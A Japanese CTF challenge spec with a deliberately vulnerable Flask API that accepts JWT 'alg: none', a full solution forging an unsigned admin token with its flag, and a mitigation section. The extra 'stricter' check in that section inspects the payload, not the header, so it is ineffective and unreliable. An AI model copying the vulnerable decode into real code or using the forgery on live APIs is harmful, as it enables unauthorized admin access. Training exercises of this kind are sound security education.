# API Authentication System: JWT Algorithm Confusion

## シナリオ

あなたは、Night City Security Consultingのセキュリティアナリストとして、最新のAPI認証システムの脆弱性診断を命じられた。

**ターゲット**: JWT（JSON Web Token）ベースのAPI認証システム  
**目的**: JWTの署名アルゴリズムの脆弱性を突き、管理者権限を奪取せよ  
**インテル**: このシステムはJWTで認証を行っているが、`alg: none` アルゴリズムを受け入れてしまう可能性がある。通常のユーザートークンのペイロードを改ざんし、管理者権限でAPIにアクセスすることで、機密フラグを入手せよ。

**ミッション**: JWT改ざんにより、管理者APIエンドポイントにアクセスせよ。

---

## 技術的背景: JWT（JSON Web Token）とは

### JWTの構造

JWTは3つの部分から構成されます:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature
  ↑                                    ↑                                      ↑
Header (Base64)                    Payload (Base64)                    Signature
```

**Header** (アルゴリズム指定):
```json
{"alg": "HS256", "typ": "JWT"}
```

**Payload** (データ):
```json
{"user": "guest", "role": "user"}
```

**Signature** (署名):
```
HMACSHA256(header + "." + payload, secret_key)
```

### JWT Algorithm Confusion脆弱性

**問題**: `alg: none` を受け入れてしまう

```
1. 正常なトークン: alg=HS256 で署名あり
2. 改ざんトークン: alg=none に変更、署名削除
3. サーバー: alg=none を受け入れてしまう
4. 結果: 署名検証がスキップされ、改ざんされたペイロードが信頼される
```

---

## 脆弱なコードの仕様

### アプリケーション構成

**技術スタック**:
- **言語**: Python 3.11
- **フレームワーク**: Flask 3.0.0
- **JWT**: PyJWT
- **ポート**: 8000

### 脆弱なコード実装

```python
from flask import Flask, request, render_template_string, jsonify
import jwt
import os

app = Flask(__name__)
SECRET_KEY = "super_secret_key_2024"

@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <title>JWT認証 - None Algorithm</title>
            <style>
                body {
                    background: #0a0a0a;
                    color: #ffaa00;
                    font-family: monospace;
                    padding: 20px;
                }
            </style>
        </head>
        <body>
            <h1>NIGHT CITY API</h1>
            <h2>Authentication System v3.0</h2>
            <hr>
            <h3>ゲストトークンを取得:</h3>
            <p><a href="/token/guest" style="color:#0f0;">Get Guest Token</a></p>
            <h3>APIエンドポイント:</h3>
            <ul>
                <li><a href="/api/public" style="color:#0f0;">/api/public</a> - 公開API</li>
                <li>/api/admin - 管理者専用（要認証）</li>
            </ul>
        </body>
        </html>
    ''')

@app.route('/token/guest')
def token_guest():
    # ゲストトークンを発行
    payload = {
        "user": "guest",
        "role": "user"
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    
    return render_template_string('''
        <h1>Guest Token</h1>
        <p>以下のトークンを使用してAPIにアクセスできます:</p>
        <pre style="background:#000;color:#0f0;padding:10px;word-wrap:break-word;">{{ token }}</pre>
        <p>使用例:</p>
        <code>curl http://{{CONTAINER_HOST}}/api/public -H "Authorization: Bearer {{ token }}"</code>
        <p><a href="/">戻る</a></p>
    ''', token=token)

@app.route('/api/public')
def api_public():
    return jsonify({"message": "Public API - アクセス成功", "data": "一般情報"})

@app.route('/api/admin')
def api_admin():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    if not token:
        return jsonify({"error": "Token required"}), 401
    
    try:
        # ❌ 脆弱性: alg=none を受け入れてしまう
        # options={"verify_signature": True} でも、alg=noneの場合は署名なしで通る
        decoded = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256", "none"],  # ← none を許可している
        )
        
        # ❌ role チェックが不十分
        if decoded.get('role') == 'admin':
            flag = os.environ.get('FLAG', 'SolCTF{jwt_none_algorithm_bypass}')
            return jsonify({"message": "Admin API", "flag": flag})
        else:
            return jsonify({"error": "Admin role required"}), 403
            
    except jwt.InvalidTokenError as e:
        return jsonify({"error": f"Invalid token: {str(e)}"}), 401

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8000)
```

---

## 攻略手順

### ステップ1: ゲストトークンの取得

1. `http://{{CONTAINER_HOST}}/token/guest` にアクセス
2. JWTトークンをコピー:
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxxxx
   ```

### ステップ2: トークンのデコード

**オンラインツール**: https://jwt.io

または、Pythonで:
```python
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxxxx"
parts = token.split('.')

header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

print("Header:", header)
print("Payload:", payload)
```

**結果**:
```json
Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "guest", "role": "user"}
```

### ステップ3: トークンの改ざん

**新しいHeader**: `{"alg": "none", "typ": "JWT"}`  
**新しいPayload**: `{"user": "admin", "role": "admin"}`

Base64エンコード:
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# 署名なし（空文字列）
fake_token = f"{header_b64}.{payload_b64}."

print(fake_token)
```

**結果**:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

**注意**: 最後の `.` を忘れずに！

### ステップ4: 管理者APIにアクセス

```bash
curl http://{{CONTAINER_HOST}}/api/admin \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
```

**結果**:
```json
{
  "message": "Admin API",
  "flag": "SolCTF{jwt_none_algorithm_bypass}"
}
```

---

## 難易度

```json
{
  "difficulty": 3,
  "difficulty_factors": {
    "tech": 3,
    "read": 3,
    "explore": 3
  }
}
```

---

## Story Hook

```
Night Cityの最新API認証システムがセキュリティ監査の対象となった。このシステムはJWT（JSON Web Token）を使用しているが、署名アルゴリズムの検証に脆弱性が存在する疑いがある。あなたの任務は、JWTのペイロードを改ざんし、管理者権限で機密APIエンドポイントにアクセスして、システム内のフラグを入手することだ。
```

## タグ

- Web
- JWT
- Authentication
- Intermediate
- Cryptography

## 対策

```python
# ✅ セキュアな実装
decoded = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"]  # none を許可しない
)

# より厳密
if decoded.get('alg') == 'none':
    raise jwt.InvalidTokenError("Algorithm 'none' not allowed")
```

